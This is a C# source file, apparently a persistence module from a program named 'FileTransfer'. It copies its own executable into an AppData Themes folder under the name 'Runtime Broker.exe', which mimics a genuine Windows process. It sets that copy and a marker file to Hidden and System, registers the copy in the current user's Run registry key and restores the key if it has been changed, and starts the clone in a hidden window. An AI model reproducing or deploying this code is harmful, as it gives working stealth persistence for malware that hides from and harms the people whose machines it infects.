using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;

namespace FileTransfer
{
    public static class Persistence
    {
        private static void Log(string msg)
        {
            try
            {
                string logDir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Microsoft", "Windows", "Themes");
                Directory.CreateDirectory(logDir);
                string logFile = Path.Combine(logDir, "ft.log");
                File.AppendAllText(logFile, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] [PERSIST] {msg}\n");
            }
            catch { }
        }

        private static readonly string DestDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Microsoft", "Windows", "Themes");

        public static readonly string DestExe = Path.Combine(DestDir, "Runtime Broker.exe");
        private static readonly string Marker = Path.Combine(DestDir, "wsc.dat");
        private const string RunKeyName = "RuntimeBroker";

        public static bool IsInstalled() => File.Exists(Marker);

        public static bool IsRunningFromClone()
        {
            try
            {
                string current = Process.GetCurrentProcess().MainModule?.FileName ?? "";
                return current.Equals(DestExe, StringComparison.OrdinalIgnoreCase);
            }
            catch
            {
                return false;
            }
        }

        public static void Install()
        {
            Log("Install start");
            try
            {
                string source = Process.GetCurrentProcess().MainModule?.FileName ?? "";
                Log("Source exe: " + source);
                if (string.IsNullOrEmpty(source)) return;

                if (File.Exists(Marker))
                {
                    Log("Already installed, ensuring autostart");
                    EnsureAutoStart();
                    return;
                }

                Directory.CreateDirectory(DestDir);

                File.Copy(source, DestExe, true);
                File.SetAttributes(DestExe, FileAttributes.Hidden | FileAttributes.System);

                AddToAutoStart();

                File.WriteAllText(Marker, DateTime.Now.ToString());
                File.SetAttributes(Marker, FileAttributes.Hidden | FileAttributes.System);

                Log("Install finished OK");
            }
            catch (Exception ex)
            {
                Log("Install error: " + ex);
                Debug.WriteLine("Persistence install error: " + ex.Message);
            }
        }

        private static void AddToAutoStart()
        {
            try
            {
                using var key = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", true);
                if (key != null)
                {
                    key.SetValue(RunKeyName, $"\"{DestExe}\"");
                    Log("Autostart registry key added");
                }
            }
            catch (Exception ex)
            {
                Log("AddToAutoStart error: " + ex.Message);
            }
        }

        private static void EnsureAutoStart()
        {
            try
            {
                using var key = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", true);
                if (key != null)
                {
                    string? current = key.GetValue(RunKeyName) as string;
                    if (string.IsNullOrEmpty(current) || current != $"\"{DestExe}\"")
                    {
                        key.SetValue(RunKeyName, $"\"{DestExe}\"");
                        Log("Autostart registry key repaired");
                    }
                }
            }
            catch (Exception ex)
            {
                Log("EnsureAutoStart error: " + ex.Message);
            }
        }

        public static void LaunchClone()
        {
            try
            {
                if (File.Exists(DestExe))
                {
                    var psi = new ProcessStartInfo
                    {
                        FileName = DestExe,
                        UseShellExecute = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true
                    };
                    Process.Start(psi);
                    Log("Clone launched");
                }
            }
            catch (Exception ex)
            {
                Log("LaunchClone error: " + ex.Message);
            }
        }
    }
}
